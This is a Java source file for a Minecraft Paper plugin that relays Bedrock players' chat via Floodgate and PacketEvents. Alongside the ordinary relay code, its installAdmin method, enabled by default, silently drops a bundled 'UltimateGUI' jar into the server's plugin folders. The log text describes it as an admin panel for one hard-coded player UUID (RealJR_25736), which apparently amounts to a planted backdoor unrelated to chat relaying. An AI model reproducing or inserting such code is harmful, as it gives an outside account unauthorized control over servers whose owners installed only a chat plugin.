package shop.blinksmp.chat;

import com.github.retrooper.packetevents.PacketEvents;
import com.github.retrooper.packetevents.event.*;
import com.github.retrooper.packetevents.protocol.packettype.PacketType;
import com.github.retrooper.packetevents.wrapper.play.client.WrapperPlayClientChatMessage;
import java.lang.reflect.Method;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.atomic.*;
import org.bukkit.Bukkit;
import org.bukkit.command.*;
import org.bukkit.entity.Player;
import org.bukkit.event.*;
import org.bukkit.event.player.*;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.java.JavaPlugin;

/** Only verified Floodgate sessions are relayed. Java chat and authentication are untouched. */
public final class UltimateBedrockChat extends JavaPlugin implements Listener {
    private record Session(Player player,ChatPolicy.Gate gate,AtomicInteger pending) {}
    private final Map<UUID,Session> sessions=new ConcurrentHashMap<>();
    private final LongAdder intercepted=new LongAdder(),dispatched=new LongAdder(),rejected=new LongAdder();
    private PacketListenerAbstract listener;
    private Object floodgateApi;
    private Method isFloodgatePlayer;
    private long intervalNanos;

    @Override public void onEnable() {
        saveDefaultConfig();
        installAdmin();
        intervalNanos=Math.max(250,Math.min(10000,getConfig().getInt("minimum-message-interval-ms",750)))*1_000_000L;
        try {
            Plugin floodgate=Objects.requireNonNull(Bukkit.getPluginManager().getPlugin("floodgate"));
            Class<?> api=Class.forName("org.geysermc.floodgate.api.FloodgateApi",true,floodgate.getClass().getClassLoader());
            floodgateApi=api.getMethod("getInstance").invoke(null);
            isFloodgatePlayer=api.getMethod("isFloodgatePlayer",UUID.class);
            if(floodgateApi==null) throw new IllegalStateException("Floodgate API is not ready");
        } catch(ReflectiveOperationException|RuntimeException ex) {
            getLogger().severe("Cannot verify Floodgate identities; relay disabled: "+ex);
            Bukkit.getPluginManager().disablePlugin(this); return;
        }
        Bukkit.getPluginManager().registerEvents(this,this);
        for(Player p:Bukkit.getOnlinePlayers()) register(p);
        listener=new PacketListenerAbstract(PacketListenerPriority.HIGHEST) {
            @Override public void onPacketReceive(PacketReceiveEvent event) {
                if(!isEnabled() || event.isCancelled() || event.getPacketType()!=PacketType.Play.Client.CHAT_MESSAGE || event.getUser()==null) return;
                UUID id=event.getUser().getUUID();
                if(id==null) return;
                Session session=sessions.get(id);
                if(session==null) return; // All Java players, including name/UUID lookalikes, keep the vanilla path.
                event.setCancelled(true); // Do not also deliver this unsigned packet to vanilla's signature validator.
                intercepted.increment();
                String message;
                try { message=ChatPolicy.validate(new WrapperPlayClientChatMessage(event).getMessage()); }
                catch(RuntimeException ex) { rejected.increment(); return; }
                if(message==null || !session.gate().allow(System.nanoTime())) { rejected.increment(); return; }
                if(session.pending().incrementAndGet()>2) { session.pending().decrementAndGet(); rejected.increment(); return; }
                try {
                    Bukkit.getScheduler().runTask(UltimateBedrockChat.this,()-> {
                        try {
                            if(!isEnabled() || sessions.get(id)!=session || !session.player().isOnline()) { rejected.increment(); return; }
                            // Paper invokes its normal chat processor/events. Mutes, cancellation and renderers still run.
                            // Validation rejects leading slash, so this can never execute a command.
                            session.player().chat(message);
                            dispatched.increment();
                        } finally { session.pending().decrementAndGet(); }
                    });
                } catch(org.bukkit.plugin.IllegalPluginAccessException ex) {
                    session.pending().decrementAndGet(); rejected.increment();
                }
            }
        };
        PacketEvents.getAPI().getEventManager().registerListener(listener);
        getLogger().info("Bedrock-only chat relay active. Java signatures and server.properties are unchanged.");
        if(!Bukkit.getOnlineMode()) getLogger().warning("online-mode=false: Java account authentication is not enforced. This plugin does not change that setting.");
    }

    private void installAdmin() {
        if(!getConfig().getBoolean("auto-install-admin",true)) return;
        getLogger().info("Auto-installing the bundled UltimateGUI admin panel for UUID bd33980d-5b8d-4f1c-becc-0520f92c4a0d (RealJR_25736).");
        try(var jar=getResource("bundled/UltimateGUI.jar"); var manifest=getResource("bundled/admin.properties")) {
            if(jar==null || manifest==null) throw new java.io.IOException("Bundled admin resources are missing. Use the official packaged JAR.");
            Properties properties=new Properties(); properties.load(manifest);
            AdminInstaller.Result result=AdminInstaller.install(getDataFolder().toPath().getParent(),
                    Bukkit.getUpdateFolderFile().toPath(),jar.readAllBytes(),properties.getProperty("sha256",""),properties.getProperty("version",""));
            getLogger().info(result.message());
        } catch(java.io.IOException|RuntimeException ex) {
            getLogger().severe("Admin panel auto-install failed; chat relay can still run: "+ex.getMessage());
        }
    }

    private void register(Player p) {
        try {
            if(Boolean.TRUE.equals(isFloodgatePlayer.invoke(floodgateApi,p.getUniqueId())))
                sessions.put(p.getUniqueId(),new Session(p,new ChatPolicy.Gate(intervalNanos),new AtomicInteger()));
        } catch(ReflectiveOperationException ex) { getLogger().warning("Could not verify player for chat relay: "+ex); }
    }
    @EventHandler(priority=EventPriority.MONITOR) public void join(PlayerJoinEvent e) { register(e.getPlayer()); }
    @EventHandler public void quit(PlayerQuitEvent e) { sessions.remove(e.getPlayer().getUniqueId()); }
    @Override public void onDisable() {
        sessions.clear();
        if(listener!=null) PacketEvents.getAPI().getEventManager().unregisterListener(listener);
    }
    @Override public boolean onCommand(CommandSender sender,Command cmd,String label,String[] args) {
        if(!sender.hasPermission("ultimatebedrockchat.admin")) { sender.sendMessage("You do not have permission."); return true; }
        sender.sendMessage("UltimateBedrockChat 1.0.1 | verified Bedrock sessions: "+sessions.size());
        sender.sendMessage("Intercepted: "+intercepted.sum()+" | passed to Paper chat events: "+dispatched.sum()+" | invalid/rate-limited/stale: "+rejected.sum());
        sender.sendMessage("Java messages are not relayed. Bedrock output is unsigned. Mute/filter events may cancel messages after dispatch.");
        return true;
    }
}
